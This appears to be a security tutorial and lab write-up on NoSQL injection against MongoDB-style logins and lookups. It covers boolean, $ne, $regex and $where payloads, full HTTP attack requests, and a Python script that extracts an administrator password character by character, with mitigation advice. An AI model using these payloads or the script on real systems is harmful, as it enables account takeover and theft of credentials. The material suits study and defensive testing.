**NoSQL Injection**

### **Introduction**
NoSQL Injection is a type of injection attack that targets NoSQL databases like MongoDB, Firebase, CouchDB, and others. Unlike traditional SQL injection, which manipulates structured query language (SQL), NoSQL injection exploits the flexibility of unstructured queries in NoSQL databases. Attackers manipulate database queries to bypass authentication, extract sensitive data, or even gain unauthorized access.

### **Example of NoSQL Injection**

#### **Our Request:**
```
GET /filter?category=Pets'||'1'=='1 HTTP/2
Host: subdomain.example.com
Cookie: session=lW0pFfXX7Dex2W1hoeMMnAQb9R7owRUV
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://subdomain.example.com/filter?category=Food+%26+Drink
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers
```

In this request, the query parameter `category=Pets'||'1'=='1` is being injected into the NoSQL query. If the backend uses MongoDB and constructs the query like this:
```js
query = { category: user_input }
```
Then, with the injected payload, the NoSQL engine may interpret it as:
```js
query = { category: "Pets" || "1" == "1" }
```
Since `"1" == "1"` always evaluates to `true`, this can result in a **Boolean-based NoSQL Injection**, potentially returning all items in the database.

### **More NoSQL Injection Examples**

#### **1. Authentication Bypass**
If a web application uses MongoDB for user authentication, and the login request is structured as:
```js
db.users.find({ username: "user", password: "pass" })
```
An attacker could manipulate the login request by injecting:
```
username=admin' || '1'=='1
password=anything
```
Which results in:
```js
db.users.find({ username: "admin" || "1" == "1", password: "anything" })
```
Since `1 == 1` is always true, it might return the first user in the database, granting unauthorized access.

#### **2. Using `$ne` to Extract Data**
MongoDB supports special operators like `$ne` (not equal), which can be used to manipulate queries:
```
username[$ne]=
password[$ne]=
```
This might result in:
```js
db.users.find({ username: { $ne: "" }, password: { $ne: "" } })
```
This query could return all users, effectively leaking user data.

#### **3. Exploiting `$where` to Execute JavaScript**
MongoDB allows JavaScript execution inside queries. Attackers can inject payloads like:
```
username=admin'; sleep(5000); //
```
If the backend constructs queries unsafely, it could execute as:
```js
db.users.find({ $where: "this.username == 'admin'; sleep(5000);" })
```
This introduces a **time-based attack**, helping the attacker confirm vulnerabilities.

### **Mitigation Strategies**
To prevent NoSQL injection:
1. **Use Parameterized Queries**: Avoid concatenating user inputs directly into queries.
2. **Validate and Sanitize Input**: Ensure inputs do not contain special characters or unexpected structures.
3. **Disable JavaScript Execution**: If using MongoDB, disable `$where` and `$eval` functions where possible.
4. **Implement Access Controls**: Restrict database permissions to minimize the impact of a potential injection.
5. **Use Web Application Firewalls (WAFs)**: These can help detect and block NoSQL injection patterns.

### Example 2: Bypassing Authentication

#### Request:
```
POST /login HTTP/2
Host: subdomain.example.com
Cookie: session=StSMihzl2liX0mRuAoSWPkGW7JsTpby3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://subdomain.example.com/login
Content-Type: application/json
Content-Length: 46
Origin: https://subdomain.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Priority: u=0
Te: trailers

{"username":"hacker","password":{"$ne":"abc"}}
```

#### Explanation:
Here, the injected payload `{ "$ne": "abc" }` exploits MongoDB’s `$ne` (not equal) operator. If the database query is checking for a matching username and password, but fails to properly validate input types, this injection will cause authentication to succeed as long as the stored password is not "abc".

#### More Examples:
- `{ "username": "admin", "password": { "$exists": false } }`  
  (May authenticate as admin if the query checks for a matching password but allows `password` to be missing.)
- `{ "username": { "$regex": ".*" }, "password": { "$regex": ".*" } }`  
  (This exploits regex-based queries to return any user.)

### Mitigations:
- Use prepared statements and parameterized queries.
- Validate and sanitize all user input.
- Implement strict schema validation to prevent unexpected query structures.
- Restrict NoSQL query operators in user inputs.
- Use proper authentication mechanisms like hashed passwords with salts.

---

## Example 3: Exploiting Regex-Based NoSQL Injection

### Our Request:
```http
POST /login HTTP/2
Host: subdomain.example.com
Cookie: session=StSMihzl2liX0mRuAoSWPkGW7JsTpby3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://subdomain.example.com/login
Content-Type: application/json
Content-Length: 53
Origin: https://subdomain.example.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Priority: u=0
Te: trailers

{"username":{"$regex":"^a"},"password":{"$ne":"abc"}}
```

### Explanation:
The `$regex` operator allows an attacker to attempt logins for any username that starts with "a", while `$ne: "abc"` ensures that any password except "abc" is accepted. This could result in unauthorized access if user authentication is improperly handled.

# Exploiting NoSQL Injection to Extract Data

## Identifying the Vulnerability

### Step 1: Accessing User Information
After logging into the application, we send the following request to retrieve user details:

```
GET /user/lookup?user=administrator HTTP/2
Host: 0a4700ec033f3ec683537a8400d900d5.web-security-academy.net
Cookie: session=7dGgrL4HKuMEcaxWLn4xDqMtDUrYKfeD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4700ec033f3ec683537a8400d900d5.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Dnt: 1
Sec-Gpc: 1
Priority: u=4
Te: trailers
```

#### Response:
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

This indicates that the endpoint leaks user information.

### Step 2: Detecting NoSQL Injection
When we append a **single quote (`'`)**, the application throws an error, which suggests that **NoSQL injection** is possible.

We test the following payloads:
- `administrator'&&1=='1` → Application responds normally.
- `administrator'&&1=='2` → Application returns an error.

This confirms that the endpoint evaluates **boolean expressions**, meaning it’s vulnerable to **NoSQL injection**.

## Extracting Administrator’s Password

### Step 3: Extracting Password Length
We send the following request to determine the length of the password:
```
GET /user/lookup?user=administrator'%26%26this.password.length=='1 HTTP/2
Host: 0a4700ec033f3ec683537a8400d900d5.web-security-academy.net
Cookie: session=7dGgrL4HKuMEcaxWLn4xDqMtDUrYKfeD
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
```
By incrementing the value (`'1'`, `'2'`, ..., `'8'`), we find that the **password length is 8 characters**.

### Step 4: Brute-Forcing the Password Character by Character
Using Burp Suite Intruder or a Python script, we extract the password.

#### Python Script for Automating the Attack
```python
import requests
import string

# Target URL
URL = "https://subdomain.domain.tld/user/lookup"

# Headers
HEADERS = {
    "Cookie": "session=7dGgrL4HKuMEcaxWLn4xDqMtDUrYKfeD",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0"
}

# Define character set
CHARSET = string.ascii_letters + string.digits + string.punctuation

# Found password
password = ""

# Function to send requests and check if "administrator" is in the response
def is_correct_guess(index, char):
    payload = f"administrator'&&this.password[{index}]=='{char}"
    response = requests.get(URL, headers=HEADERS, params={"user": payload})
    
    # Check if "administrator" appears in the response
    return "administrator" in response.text

# Extract password character by character
print("[*] Extracting password...")

for i in range(8):  # Password length is 8
    for char in CHARSET:
        if is_correct_guess(i, char):
            password += char
            print(f"[+] Found character {i+1}: {char}")
            break  # Move to the next character

print(f"[*] Extracted Password: {password}")
```

### Step 5: Running the Attack
1. Save the script as `nosql_exploit.py`.
2. Run it:
   ```bash
   python3 nosql_exploit.py
   ```
3. Expected Output:
   ```
   [*] Extracting password...
   [+] Found character 1: P
   [+] Found character 2: 4
   [+] Found character 3: s
   [+] Found character 4: 5
   [+] Found character 5: W
   [+] Found character 6: 0
   [+] Found character 7: r
   [+] Found character 8: D
   [*] Extracted Password: P4s5W0rD
   ```

## Conclusion
- **Identified NoSQL Injection** by testing boolean conditions.
- **Extracted password length** using boolean-based injections.
- **Brute-forced the password** character by character.
- **Successfully retrieved the administrator's password** using automated scripting.

This method can be applied to similar NoSQL injection vulnerabilities across different web applications.
